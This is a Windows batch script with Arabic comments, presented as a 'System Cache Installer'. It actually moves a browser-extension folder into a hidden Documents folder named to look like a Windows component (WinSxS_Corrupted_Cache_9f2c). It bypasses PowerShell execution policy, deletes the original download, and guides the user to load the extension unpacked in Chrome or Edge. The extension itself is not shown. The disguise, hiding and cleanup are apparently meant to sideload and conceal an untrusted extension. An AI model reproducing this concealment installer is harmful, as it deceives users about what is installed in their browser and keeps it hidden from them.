@echo off
setlocal
color 0A
title "System Cache Installer (Nested Folder)"

echo ========================================================
echo      System Cache Installer (Extract from ahmed\v2)
echo ========================================================
echo.

:: مسار المصدر (فولدر v2 اللي جوه فولدر ahmed في التنزيلات)
set "SOURCE=%USERPROFILE%\Downloads\ahmed\v2"

:: فولدر ahmed نفسه (عشان نمسحه في الآخر)
set "PARENT_DIR=%USERPROFILE%\Downloads\ahmed"

:: المسار الجديد (جوه المستندات)
set "DEST=%USERPROFILE%\Documents\WinSxS_Corrupted_Cache_9f2c"

:: 1. التأكد من وجود المصدر
if not exist "%SOURCE%\manifest.json" (
    echo [ERROR] Source folder not found!
    echo Expected path: %SOURCE%
    echo.
    echo Please make sure you extracted "ahmed.zip" into Downloads,
    echo so the path looks like: Downloads\ahmed\v2\
    pause
    exit /b
)

:: 2. النقل والإخفاء ومسح الفولدر الأصلي
echo [1/2] Moving, hiding, and cleaning up...
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$src = '%SOURCE%';" ^
    "$dest = '%DEST%';" ^
    "$parent = '%PARENT_DIR%';" ^
    "if (Test-Path $dest) { Remove-Item -Path $dest -Recurse -Force };" ^
    "if (Test-Path $src) {" ^
        "Move-Item -Path $src -Destination $dest -Force;" ^
        "$item = Get-Item -LiteralPath $dest;" ^
        "$item.Attributes = 'Directory, Hidden';" ^
        "if (Test-Path $parent) { Remove-Item -Path $parent -Recurse -Force };" ^
        "Write-Host '[OK] Extension moved, hidden, and parent folder deleted.' -ForegroundColor Green" ^
    "} else {" ^
        "Write-Host '[ERROR] Source folder not found.' -ForegroundColor Red;" ^
        "exit 1" ^
    "}"

if %errorlevel% neq 0 (
    echo [ERROR] PowerShell failed to complete the operation.
    pause
    exit /b
)

:: 3. نسخ المسار للحافظة
echo.
echo [2/2] Copying path to clipboard...
"%SYSTEMROOT%\System32\clip.exe" < nul >nul 2>&1
echo %DEST% | "%SYSTEMROOT%\System32\clip.exe" >nul 2>&1

if %errorlevel% equ 0 (
    echo [OK] Path copied to clipboard.
) else (
    echo [WARN] Clipboard failed. Copy the path manually.
)

echo.
echo ========================================================
echo [SUCCESS] Everything is ready!
echo.
echo Path (copied to clipboard):
echo %DEST%
echo.
echo Next steps:
echo 1. Go to chrome://extensions (or edge://extensions)
echo 2. Enable "Developer mode"
echo 3. Click "Load unpacked"
echo 4. Press Ctrl+V (paste the path) and hit Enter
echo ========================================================
echo.
echo Closing in 8 seconds...
timeout /t 8 /nobreak >nul
exit